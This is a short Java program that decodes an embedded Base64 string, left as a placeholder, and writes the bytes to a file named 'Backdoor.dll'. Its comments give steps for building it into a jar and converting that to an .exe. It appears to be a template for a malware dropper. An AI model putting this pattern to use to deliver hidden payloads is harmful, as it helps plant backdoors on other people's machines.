// javac Base64ToFile.java
// jar cfe Base64ToFile.jar Base64ToFile Base64ToFile.class
// https://genuinecoder.com/online-converter/jar-to-exe/

import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Base64;
import java.nio.file.Paths;

public class Base64ToFile {
    public static void main(String[] args) {
        // Replace with your Base64 encoded string
        String base64String = "Your base64 string here";

        try {
            byte[] decodedBytes = Base64.getDecoder().decode(base64String);
            String filePath = Paths.get("Backdoor.dll").toAbsolutePath().toString(); // Save in the same directory
            
            try (FileOutputStream fos = new FileOutputStream(filePath)) {
                fos.write(decodedBytes);
            }
            
            System.out.println("File saved successfully at: " + filePath);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

